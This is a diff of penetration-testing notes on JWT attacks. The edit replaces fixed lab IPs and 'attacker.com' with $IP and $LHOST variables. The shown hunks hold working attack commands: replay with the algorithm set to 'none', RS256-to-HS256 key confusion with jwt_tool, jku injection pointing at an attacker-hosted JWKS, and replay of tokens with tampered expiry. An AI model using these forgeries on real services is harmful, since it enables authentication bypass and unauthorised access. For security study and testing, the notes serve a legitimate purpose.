@@ -18,7 +18,7 @@
 ### Extracting JWT from cURL Responses
 
 ```bash
-curl -v http://10.10.10.10/api -H "Authorization: Bearer <JWT>"
+curl -v http://$IP/api -H "Authorization: Bearer <JWT>"
 ```
 
 ### Decoding a JWT
@@ -45,7 +45,7 @@ If the server does not validate the algorithm field properly, change it to `none
 Replay the modified token:
 
 ```bash
-curl -H "Authorization: Bearer <MODIFIED_JWT>" http://10.10.10.10/api
+curl -H "Authorization: Bearer <MODIFIED_JWT>" http://$IP/api
 ```
 
 ### Signature Forgery with Weak Secrets
@@ -70,7 +70,7 @@ If the server accepts the algorithm field from the header, swap `RS256` to `HS25
 Grab the public key (commonly exposed at `/jwks.json`, `/.well-known/jwks.json`, or the JWT's `jku`):
 
 ```bash
-curl -s http://10.10.10.10/.well-known/jwks.json
+curl -s http://$IP/.well-known/jwks.json
 ```
 
 Forge with jwt_tool:
@@ -84,7 +84,7 @@ jwt_tool <JWT> -X k -pk public.pem
 If the server honors the `jku` (JWK Set URL) header to fetch the verification key, point it at an attacker-hosted JWKS and sign with the matching private key:
 
 ```bash
-jwt_tool <JWT> -X s -ju http://attacker.com/jwks.json
+jwt_tool <JWT> -X s -ju http://$LHOST/jwks.json
 ```
 
 The server fetches the attacker JWKS, pulls the attacker's public key, and validates the attacker-signed token. Works when the server doesn't pin or allowlist the jku host.
@@ -124,5 +124,5 @@ If the server does not properly validate token expiration (`exp` claim), modify 
 Replay:
 
 ```bash
-curl -H "Authorization: Bearer <MODIFIED_JWT>" http://10.10.10.10/api
+curl -H "Authorization: Bearer <MODIFIED_JWT>" http://$IP/api
 ```
